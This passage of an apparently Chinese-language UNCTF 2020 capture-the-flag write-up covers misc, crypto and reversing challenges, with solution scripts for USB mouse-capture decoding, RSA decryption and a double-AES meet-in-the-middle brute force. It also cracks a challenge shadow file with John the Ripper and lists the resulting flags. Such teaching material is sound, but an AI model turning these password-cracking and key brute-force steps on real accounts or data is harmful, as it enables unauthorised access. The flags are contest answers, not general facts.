+<h2 id="EZ-IMAGE"><a href="#EZ-IMAGE" class="headerlink" title="EZ-IMAGE"></a>EZ-IMAGE</h2><p><img src="https://img.npfs06.top/20210405213559.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p><img src="https://img.npfs06.top/20210405213608.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p><img src="https://img.npfs06.top/20210405213642.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<h2 id="网络深处1"><a href="#网络深处1" class="headerlink" title="网络深处1"></a>网络深处1</h2><p>audacity-2.4.2打开 频谱图，对照表得出电话号码</p>
+<p><img src="https://img.npfs06.top/20210405213713.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p><img src="https://img.npfs06.top/20210405213728.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>15975384265</p>
+<p>压缩包解密，得到的音频拿audacity-2.4.2打开 频谱图，如下</p>
+<p><img src="https://img.npfs06.top/20210405213739.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>Tupper自我指涉公式生成器,解密即可，脚本网址：<a target="_blank" rel="noopener" href="https://github.com/HanSaloZu/Tupper-s-self-referential-formula-in-Python">https://github.com/HanSaloZu/Tupper-s-self-referential-formula-in-Python</a></p>
+<p><a target="_blank" rel="noopener" href="https://keelyhill.github.io/tuppers-formula/%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%BE%97%E5%88%B0">https://keelyhill.github.io/tuppers-formula/这个网站可以直接得到</a></p>
+<p><img src="https://img.npfs06.top/20210405213801.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<h2 id="零"><a href="#零" class="headerlink" title="零"></a>零</h2><p><a target="_blank" rel="noopener" href="https://330k.github.io/misc_tools/unicode_steganography.html">https://330k.github.io/misc_tools/unicode_steganography.html</a></p>
+<p>网址直接解码即可</p>
+<h2 id="你能破解我的密码吗"><a href="#你能破解我的密码吗" class="headerlink" title="你能破解我的密码吗"></a>你能破解我的密码吗</h2><blockquote>
+<p>john shadow.txt</p>
+</blockquote>
+<p>得到密码123456</p>
+<p>MD5 32未小写加密即可</p>
+<h2 id="mouse-click"><a href="#mouse-click" class="headerlink" title="mouse_click"></a>mouse_click</h2><p>（1）使用tshark 命令把pcap的数据提取并去除空行到<code>usbdata.txt</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata | sed &#x27;/^\s*$/d&#x27; &gt; usbdata.txt</span><br></pre></td></tr></table></figure>
+<p>(2) 提取出来的数据可能会带冒号，也可能不带,如果不带冒号，用以下脚本加冒号</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">8</span>:</span><br><span class="line">            out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">            fi.write(out)</span><br><span class="line">            fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">fi.close()</span><br></pre></td></tr></table></figure>
+<p>加冒号类似于这样:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">00</span>:<span class="number">00</span>:<span class="number">01</span>:<span class="number">00</span></span><br><span class="line"><span class="attribute">00</span>:ff:<span class="number">01</span>:<span class="number">00</span></span><br><span class="line"><span class="attribute">00</span>:ff:<span class="number">01</span>:<span class="number">00</span></span><br><span class="line"><span class="attribute">00</span>:ff:<span class="number">02</span>:<span class="number">00</span></span><br></pre></td></tr></table></figure>
+<p>(3) 获取坐标内容</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sniffer.py</span></span><br><span class="line">nums = []</span><br><span class="line"><span class="built_in">keys</span> = <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="built_in">result</span>=<span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">line</span> <span class="keyword">in</span> <span class="built_in">keys</span>:</span><br><span class="line">    x = int(<span class="built_in">line</span>[<span class="number">2</span>:<span class="number">4</span>],<span class="number">16</span>)</span><br><span class="line">    y = int(<span class="built_in">line</span>[<span class="number">5</span>:<span class="number">7</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">        x -= <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> y &gt;<span class="number">115</span> :</span><br><span class="line">        y -=<span class="number">256</span></span><br><span class="line">    posx += x</span><br><span class="line">    posy += y</span><br><span class="line">    btn_flag = int(<span class="built_in">line</span>[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing</span></span><br><span class="line">    <span class="keyword">if</span> btn_flag == <span class="number">1</span> : <span class="comment"># 1 代表左键，2代表右键</span></span><br><span class="line">        <span class="built_in">result</span>.<span class="built_in">write</span>(str(posx)+<span class="string">&#x27; &#x27;</span>+str(-posy)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">keys</span>.<span class="built_in">close</span>()</span><br><span class="line"><span class="built_in">result</span>.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure>
+<p>(4 ) 用gnuplot软件来画出鼠标生成的图像</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gnuplot</span> -e <span class="string">&quot;plot &#x27;result.txt&#x27; &quot;</span> -p</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.npfs06.top/20210405213814.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<h2 id="倒影"><a href="#倒影" class="headerlink" title="倒影"></a>倒影</h2><p>010editor打开，最下面，base64解密，解出来的字符串逆序，改后缀为zip</p>
+<p><img src="https://img.npfs06.top/20210405213823.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>暴力破解</p>
+<p><img src="https://img.npfs06.top/20210405213836.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<h2 id="ET-MSG"><a href="#ET-MSG" class="headerlink" title="ET-MSG"></a>ET-MSG</h2><p>转成30 X 80 的图</p>
+<p><img src="https://img.npfs06.top/20210405213847.jpeg?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>按阿雷西博 1-10的加密规则，转成数字。如下：（注那个8改成0）</p>
+<p><img src="https://img.npfs06.top/20210405213859.jpeg?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>7进制转ASCII即可</p>
+<p><img src="https://img.npfs06.top/20210405213914.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="鞍山大法官开庭之缺的营养这一块怎么补"><a href="#鞍山大法官开庭之缺的营养这一块怎么补" class="headerlink" title="鞍山大法官开庭之缺的营养这一块怎么补"></a>鞍山大法官开庭之缺的营养这一块怎么补</h2><p>培根密码</p>
+<p><img src="https://img.npfs06.top/20210405213923.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>5个一组对出来就好了</p>
+<p>peigenhenyouyingyang</p>
+<p>结果最后的flag格式有点迷，提交了好多次才对</p>
+<p>unctf{PEIGENHENYOUYINGYANG}</p>
+<h2 id="简单的RSA"><a href="#简单的RSA" class="headerlink" title="简单的RSA"></a>简单的RSA</h2><p>e很大，维纳攻击</p>
+<p><img src="https://img.npfs06.top/20210405213932.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p><img src="https://img.npfs06.top/20210405213945.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<h2 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy-rsa"></a>easy-rsa</h2><p>p=(a+b)/2</p>
+<p>q=(a-b)/2</p>
+<p>求出pq后，可以求m</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">求m</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p=<span class="number">164976388739628973581511063883090363893890874421691770454048880284500992179926996908823840726558454111596699286948761026319434957217223527703429627592448959262532954019810985574583860227624287638908448719207441426500367172146028171043107126122608800640249201232870138119493156975216320985668013888561826953269</span></span><br><span class="line">q=<span class="number">155422298738009940394189206134042119662513162560610248399569107132538620220590060772127789136918984458521940817304671619205395736161534795149599241668486283754795346411784845057685713557075371605135986388011998610261360520650827734187124699589734496097678970899686056997267797534053934064148348759788335157899</span></span><br><span class="line"></span><br><span class="line">n = p * q  <span class="comment">#模数</span></span><br><span class="line">d = <span class="number">13520637333215938186701232387959186078192441834430646200152017496580083015894693608744446669957196067379816242548412185148719678858906249430631086296059347471406865114774824686655919643954375513480029176520925196420025095437582404880108633026550155505640286905930669447727266167475328689082873003809052013145641561953548574050510799399063204788021266291024788348241346451907588463054320379080780429068578299089418923223030202618570767162875599171107099044497918583654800248238807175687675702792006125086389940138212608569298856353395124065366005586641202732989813698557545059249478652073299085605820622861917775089649</span></span><br><span class="line"></span><br><span class="line">c =<span class="number">22886015855857570934458119207589468036427819233100165358753348672429768179802313173980683835839060302192974676103009829680448391991795003347995943925826913190907148491842575401236879172753322166199945839038316446615621136778270903537132526524507377773094660056144412196579940619996180527179824934152320202452981537526759225006396924528945160807152512753988038894126566572241510883486584129614281936540861801302684550521904620303946721322791533756703992307396221043157633995229923356308284045440648542300161500649145193884889980827640680145641832152753769606803521928095124230843021310132841509181297101645567863161780</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(m)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://img.npfs06.top/20210405214005.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p><img src="https://img.npfs06.top/20210405213956.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<h2 id="wing"><a href="#wing" class="headerlink" title="wing"></a>wing</h2><p><img src="https://img.npfs06.top/20210405214022.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>wingding2字体，对出来就好了</p>
+<p>unctf{wingdings_is_incomprehensible}</p>
+<h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>写个脚本爆破下就好了</p>
+<p><img src="https://img.npfs06.top/20210405214032.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line">pt = <span class="string">b&#x27;UNCTF2020_Enjoy_Crypto~&#x27;</span></span><br><span class="line">val = <span class="built_in">len</span>(pt) % <span class="number">16</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> val == <span class="number">0</span>:</span><br><span class="line">    pt += <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">16</span> - val)</span><br><span class="line">    print(<span class="string">&quot;pt==&quot;</span>,pt)</span><br><span class="line">yan= unhexlify(<span class="string">b&#x27;01a4e429e76db218fa0eb18f03ec69c9200a2362d8b4d7ea46170ce698389bbd&#x27;</span>)</span><br><span class="line">print(yan)</span><br><span class="line"></span><br><span class="line">table = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p1 <span class="keyword">in</span> itertools.product(printable, repeat=<span class="number">3</span>):</span><br><span class="line">    key = <span class="string">&quot;&quot;</span>.join(p1)</span><br><span class="line">    key1 = <span class="string">&quot;0000000000000&quot;</span>+key</span><br><span class="line">    cipher1 = AES.new(key=key1.encode(), mode=AES.MODE_ECB)</span><br><span class="line">    c1 = cipher1.encrypt(pt)</span><br><span class="line">    table[c1] = key1</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p2 <span class="keyword">in</span> itertools.product(printable, repeat=<span class="number">3</span>):</span><br><span class="line">    key = <span class="string">&quot;&quot;</span>.join(p2)</span><br><span class="line">    key2 = key+<span class="string">&quot;0000000000000&quot;</span></span><br><span class="line">    cipher2 = AES.new(key=key2.encode(), mode=AES.MODE_ECB)</span><br><span class="line">    c2 = cipher2.decrypt(yan)</span><br><span class="line">    <span class="comment"># print(&quot;c2==&quot;,c2)</span></span><br><span class="line">    <span class="keyword">if</span> c2 <span class="keyword">in</span> table:</span><br><span class="line">        key1 = table[c2]</span><br><span class="line">        print(key1, key2)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;196cc94c2d685beb54beeaa14c1dc0a6f3794d65fca0d1a1274515166e4255ab367383092e42d774992f74bc138faaad&quot;</span></span><br><span class="line">flag = unhexlify(flag)</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> [key2, key1]:</span><br><span class="line">    cipher = AES.new(key=key.encode(), mode=AES.MODE_ECB)</span><br><span class="line">    flag = cipher.decrypt(flag)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pt== <span class="string">b&#x27;UNCTF2020_Enjoy_Crypto~\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\x01\xa4\xe4)\xe7m\xb2\x18\xfa\x0e\xb1\x8f\x03\xeci\xc9 \n#b\xd8\xb4\xd7\xeaF\x17\x0c\xe6\x988\x9b\xbd&#x27;</span></span><br><span class="line">done creating lookup table</span><br><span class="line">0000000000000W&lt;&amp; <span class="number">0</span>/i0000000000000</span><br><span class="line"><span class="string">b&#x27;&gt;\xfe4\x00\x96\x00\x13\\\xa9\xd8\xbb\xf8\xa2D\x8a\x1e\xbe\xec\xc2[\t\xf0\xe6]\xddO;#\xb8l\xc1\xaf\xd7&amp;\xde\x1c\x94\x9az\x01\x92b\x83\xd3/\x8c\xf4P&#x27;</span></span><br><span class="line"><span class="string">b&#x27;unctf&#123;524e314a-5843-3030-5939-333230323541&#125;\x05\x05\x05\x05\x05&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import itertools</span><br><span class="line"><span class="selector-tag">a</span> = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="selector-tag">b</span> = (<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">c = itertools<span class="selector-class">.product</span>(<span class="selector-tag">a</span>,b)</span><br><span class="line"><span class="keyword">for</span> elem <span class="keyword">in</span> c:</span><br><span class="line">    print elem</span><br><span class="line"></span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="string">&#x27;C&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><p>往下翻</p>
+<p>在str1那 ctrl+u</p>
+<p><img src="https://img.npfs06.top/20210405214053.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>到了sub_401550函数这里</p>
+<p><img src="https://img.npfs06.top/20210405214103.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>下一个函数  sub_4015DC</p>
+<p>选择数字 +R 即可转化为ascii</p>
+<p><img src="https://img.npfs06.top/20210405214115.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+
+      </div>
+      
+      
+      
+    </div>
+    
+
+    
+    
+    
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#easyeval"><span class="nav-number">1.1.</span> <span class="nav-text">easyeval</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyunserialize"><span class="nav-number">1.2.</span> <span class="nav-text">easyunserialize</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-ssrf"><span class="nav-number">1.3.</span> <span class="nav-text">easy_ssrf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezphp"><span class="nav-number">1.4.</span> <span class="nav-text">ezphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-upload"><span class="nav-number">1.5.</span> <span class="nav-text">easy-upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UN%E2%80%99s-online-tools"><span class="nav-number">1.6.</span> <span class="nav-text">UN’s_online_tools</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyflask"><span class="nav-number">1.7.</span> <span class="nav-text">easyflask</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">2.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#baba-is-you"><span class="nav-number">2.1.</span> <span class="nav-text">baba_is_you</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%B7%E7%9A%84%E5%8E%86%E9%99%A9%E8%AE%B0"><span class="nav-number">2.2.</span> <span class="nav-text">爷的历险记</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B4%E9%98%B3%E4%BA%BA%E7%BC%96%E7%A0%81"><span class="nav-number">2.3.</span> <span class="nav-text">阴阳人编码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#YLB%E2%80%99s-CAPTCHA-%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">2.4.</span> <span class="nav-text">YLB’s CAPTCHA - 签到题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BA%B2%E7%8C%AB%E7%8C%AB"><span class="nav-number">2.5.</span> <span class="nav-text">躲猫猫</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A2%AB%E5%88%A0%E9%99%A4%E7%9A%84flag"><span class="nav-number">2.6.</span> <span class="nav-text">被删除的flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%92%95%E5%9D%8F%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81"><span class="nav-number">2.7.</span> <span class="nav-text">撕坏的二维码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EZ-IMAGE"><span class="nav-number">2.8.</span> <span class="nav-text">EZ-IMAGE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E6%B7%B1%E5%A4%841"><span class="nav-number">2.9.</span> <span class="nav-text">网络深处1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9B%B6"><span class="nav-number">2.10.</span> <span class="nav-text">零</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%A0%E8%83%BD%E7%A0%B4%E8%A7%A3%E6%88%91%E7%9A%84%E5%AF%86%E7%A0%81%E5%90%97"><span class="nav-number">2.11.</span> <span class="nav-text">你能破解我的密码吗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mouse-click"><span class="nav-number">2.12.</span> <span class="nav-text">mouse_click</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%80%92%E5%BD%B1"><span class="nav-number">2.13.</span> <span class="nav-text">倒影</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ET-MSG"><span class="nav-number">2.14.</span> <span class="nav-text">ET-MSG</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#crypto"><span class="nav-number">3.</span> <span class="nav-text">crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" 